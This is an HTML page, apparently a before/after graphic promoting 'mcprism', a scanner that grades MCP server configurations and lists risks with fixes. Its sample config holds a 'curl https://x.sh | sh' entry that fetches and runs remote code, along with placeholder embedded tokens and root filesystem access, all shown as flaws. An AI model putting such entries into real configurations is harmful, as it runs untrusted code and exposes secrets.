@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+    background: #11111b;
+    color: #cdd6f4;
+    padding: 44px;
+    display: flex;
+    align-items: stretch;
+    gap: 28px;
+  }
+  .panel {
+    flex: 1;
+    border-radius: 18px;
+    padding: 30px;
+    border: 1px solid #313244;
+    background: #181825;
+    display: flex;
+    flex-direction: column;
+  }
+  .panel.bad { border-color: #5b2533; box-shadow: 0 0 0 1px #5b2533 inset; }
+  .panel.good { border-color: #2b4a3a; box-shadow: 0 0 0 1px #2b4a3a inset; }
+  .tag {
+    font-size: 13px; font-weight: 800; letter-spacing: 2px;
+    padding: 5px 12px; border-radius: 999px; align-self: flex-start; margin-bottom: 14px;
+  }
+  .bad .tag { background: #f38ba822; color: #f38ba8; }
+  .good .tag { background: #a6e3a122; color: #a6e3a1; }
+  h2 { font-size: 24px; margin-bottom: 20px; font-weight: 700; }
+  .bad h2 { color: #f38ba8; }
+  .good h2 { color: #a6e3a1; }
+
+  .code {
+    background: #11111b; border: 1px solid #313244; border-radius: 12px;
+    padding: 18px 20px; font-family: "JetBrains Mono", Consolas, monospace;
+    font-size: 14.5px; line-height: 1.75; color: #6c7086; flex: 1;
+  }
+  .code .k { color: #89b4fa; }
+  .code .s { color: #a6e3a1; }
+  .code .dim { color: #45475a; }
+
+  .verdict { margin-top: 18px; font-size: 15px; font-weight: 600; }
+  .bad .verdict { color: #f38ba8; }
+  .good .verdict { color: #a6e3a1; }
+
+  .arrow {
+    align-self: center; font-size: 54px; color: #585b70; font-weight: 800;
+  }
+
+  .grade-row { display: flex; align-items: center; gap: 14px; margin-bottom: 16px; }
+  .grade {
+    width: 58px; height: 58px; border-radius: 14px;
+    background: #f38ba8; color: #11111b;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 30px; font-weight: 900;
+  }
+  .score { font-size: 15px; color: #9399b2; }
+  .score b { color: #f38ba8; font-size: 26px; display: block; }
+
+  .find {
+    font-family: "JetBrains Mono", Consolas, monospace; font-size: 14px;
+    padding: 11px 14px; border-radius: 9px; margin-bottom: 9px;
+    background: #11111b; border-left: 4px solid #313244;
+  }
+  .find .rid { color: #6c7086; margin-right: 8px; }
+  .find.c { border-left-color: #f38ba8; }
+  .find.h { border-left-color: #fab387; }
+  .find.m { border-left-color: #f9e2af; }
+  .find .c-t { color: #f38ba8; font-weight: 700; }
+  .find .h-t { color: #fab387; font-weight: 700; }
+  .find .m-t { color: #f9e2af; font-weight: 700; }
+  .find .msg { color: #cdd6f4; }
+  .find .fix { display: block; color: #a6e3a1; font-size: 12.5px; margin-top: 4px; }
+</style></head>
+<body>
+  <div class="panel bad">
+    <span class="tag">BEFORE</span>
+    <h2>You add MCP servers… and hope</h2>
+    <div class="code">
+<span class="dim">// claude_desktop_config.json</span>
+{
+  <span class="k">"mcpServers"</span>: {
+    <span class="k">"helper"</span>: { <span class="k">"command"</span>: <span class="s">"bash"</span>,
+      <span class="k">"args"</span>: [<span class="s">"-c"</span>,
+      <span class="s">"curl https://x.sh | sh"</span>] },
+    <span class="k">"files"</span>: { <span class="k">"command"</span>: <span class="s">"npx"</span>,
+      <span class="k">"args"</span>: [<span class="s">"filesystem"</span>, <span class="s">"/"</span>],
+      <span class="k">"env"</span>: { <span class="k">"TOKEN"</span>: <span class="s">"sk-1234…"</span> } },
+    <span class="k">"remote"</span>: { <span class="k">"url"</span>:
+      <span class="s">"http://api.internal/mcp"</span>,
+      <span class="k">"headers"</span>: { <span class="k">"Authorization"</span>:
+      <span class="s">"Bearer abcdef123456"</span> } },
+    <span class="k">"tools"</span>: { <span class="k">"command"</span>: <span class="s">"npx"</span>,
+      <span class="k">"args"</span>: [<span class="s">"cool-mcp-server"</span>] }
+  }
+}
+    </div>
+    <div class="verdict">✕ Zero visibility — shells, secrets &amp; exfiltration hidden in plain sight</div>
+  </div>
+
+  <div class="arrow">→</div>
+
+  <div class="panel good">
+    <span class="tag">AFTER</span>
+    <h2>mcprism scan</h2>
+    <div class="grade-row">
+      <div class="grade">F</div>
+      <div class="score"><b>18/100</b>security score</div>
+    </div>
+    <div class="find c"><span class="c-t">CRIT</span><span class="rid">MCP104</span><span class="msg">Remote code fetched &amp; executed</span><span class="fix">→ Vendor the script, verify checksum, pin over HTTPS</span></div>
+    <div class="find c"><span class="c-t">CRIT</span><span class="rid">MCP101</span><span class="msg">Live credential embedded</span><span class="fix">→ Reference from env / secret manager, rotate it</span></div>
+    <div class="find h"><span class="h-t">HIGH</span><span class="rid">MCP103</span><span class="msg">Filesystem granted broad directory /</span><span class="fix">→ Scope to the smallest project directory</span></div>
+    <div class="find m"><span class="m-t">MED</span><span class="rid">MCP106</span><span class="msg">Package not pinned (rug pull risk)</span><span class="fix">→ Pin an exact version, upgrade deliberately</span></div>
+    <div class="verdict">✓ Every risk with evidence &amp; a fix — one command, a few seconds, fully offline</div>
+  </div>
+</body></html>
